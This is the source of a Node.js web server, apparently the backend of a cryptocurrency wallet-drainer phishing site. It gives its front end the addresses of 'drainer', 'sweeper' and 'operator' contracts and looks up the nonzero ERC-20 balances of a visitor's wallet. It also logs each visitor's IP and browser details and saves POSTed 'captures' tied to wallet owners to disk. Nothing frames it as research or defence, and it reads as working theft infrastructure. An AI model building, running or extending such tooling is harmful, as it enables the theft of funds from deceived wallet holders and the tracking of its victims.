import { createServer } from "node:http";
import { readFile, writeFile, mkdir, appendFile } from "node:fs/promises";
import { extname, join } from "node:path";

const PORT = Number(process.env.PORT || 8787);
const ROOT = new URL("./web", import.meta.url).pathname;
const TYPES = { ".html": "text/html", ".js": "text/javascript", ".css": "text/css", ".json": "application/json" };
const LOG = new URL("./logs/sessions.jsonl", import.meta.url).pathname;
const BLOCKSCOUT = "https://eth.blockscout.com/api/v2";

await mkdir(new URL("./captures", import.meta.url), { recursive: true });
await mkdir(new URL("./logs", import.meta.url), { recursive: true });

const started = Date.now();
const CORS = {
  "access-control-allow-origin": "*",
  "access-control-allow-headers": "content-type",
  "access-control-allow-methods": "GET,POST,OPTIONS",
};

function parseEnv(text) {
  const out = {};
  for (const line of text.split("\n")) {
    const m = line.match(/^\s*([A-Z0-9_]+)\s*=\s*"?([^"\n]*)"?\s*$/);
    if (m) out[m[1]] = m[2];
  }
  return out;
}

async function deployments() {
  const cfg = {};
  try {
    Object.assign(cfg, JSON.parse(await readFile(new URL("./.deployments.json", import.meta.url), "utf8")));
  } catch {}
  try {
    Object.assign(cfg, parseEnv(await readFile(new URL("./.env", import.meta.url), "utf8")));
  } catch {}
  return cfg;
}

const who = (req) => ({
  ip: (req.headers["cf-connecting-ip"] || req.headers["x-forwarded-for"] || req.socket.remoteAddress || "").split(",")[0].trim(),
  ua: (req.headers["user-agent"] || "").slice(0, 160),
  ref: (req.headers["referer"] || "").slice(0, 160),
});

const track = (obj) => appendFile(LOG, JSON.stringify({ ts: new Date().toISOString(), ...obj }) + "\n").catch(() => {});

async function discoverTokens(owner) {
  const r = await fetch(`${BLOCKSCOUT}/addresses/${owner}/token-balances`);
  if (!r.ok) return [];
  const rows = await r.json();
  const out = [];
  for (const x of rows ?? []) {
    const t = x?.token;
    if (!t || t.type !== "ERC-20" || !t.address_hash) continue;
    try {
      if (BigInt(x.value) === 0n) continue;
    } catch {
      continue;
    }
    out.push({ symbol: (t.symbol || "?").slice(0, 12), address: t.address_hash, decimals: Number(t.decimals ?? 18) });
  }
  return out;
}

createServer(async (req, res) => {
  const [url, qs] = req.url.split("?");
  const q = new URLSearchParams(qs ?? "");
  if (url.startsWith("/api/")) for (const [k, v] of Object.entries(CORS)) res.setHeader(k, v);
  if (req.method === "OPTIONS" && url.startsWith("/api/")) return res.writeHead(204).end();

  if (req.method === "GET" && url === "/health") {
    const cfg = await deployments();
    return res
      .writeHead(200, { "content-type": "application/json" })
      .end(JSON.stringify({ ok: true, uptime_s: Math.round((Date.now() - started) / 1000), drainer: cfg.drainer ?? null, chainId: cfg.CHAIN_ID ?? null }));
  }

  if (req.method === "GET" && url === "/api/config") {
    const cfg = await deployments();
    track({ kind: "visit", ...who(req) });
    return res.writeHead(200, { "content-type": "application/json" }).end(
      JSON.stringify({
        rpc: process.env.RPC_URL || cfg.RPC_URL,
        drainer: cfg.drainer,
        sweeper: cfg.sweeper,
        operator: cfg.operator,
        chainId: cfg.CHAIN_ID,
      }),
    );
  }

  if (req.method === "GET" && url === "/api/tokens") {
    const owner = q.get("owner") ?? "";
    if (!/^0x[0-9a-fA-F]{40}$/.test(owner)) return res.writeHead(400).end(JSON.stringify({ error: "owner invalido" }));
    const tokens = await discoverTokens(owner).catch(() => []);
    return res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ tokens }));
  }

  if (req.method === "GET" && url === "/api/sessions") {
    let lines = [];
    try {
      lines = (await readFile(LOG, "utf8")).trim().split("\n").filter(Boolean);
    } catch {}
    const n = Math.min(Number(q.get("limit") || 50), 500);
    return res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ total: lines.length, tail: lines.slice(-n).map((l) => JSON.parse(l)) }));
  }

  if (req.method === "POST" && url === "/api/capture") {
    let body = "";
    for await (const chunk of req) body += chunk;
    let data;
    try {
      data = JSON.parse(body);
      if (!data.kind || !data.owner) throw new Error("kind/owner obrigatorios");
    } catch (err) {
      return res.writeHead(400).end(JSON.stringify({ error: err.message }));
    }
    const name = `${Date.now()}-${data.kind}-${data.owner.slice(0, 10)}.json`;
    await writeFile(join(ROOT, "..", "captures", name), JSON.stringify(data, null, 2));
    track({ kind: "capture", capture: data.kind, owner: data.owner, file: name, ...who(req) });
    console.log(`capture ${name} (${data.kind} de ${data.owner})`);
    return res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ ok: true, file: `captures/${name}` }));
  }

  const path = url === "/" ? "/index.html" : url;
  try {
    const file = await readFile(join(ROOT, path));
    res.writeHead(200, { "content-type": TYPES[extname(path)] || "application/octet-stream" }).end(file);
  } catch {
    res.writeHead(404).end("not found");
  }
}).listen(PORT, () => console.log(`front-end em http://127.0.0.1:${PORT} | health: /health`));
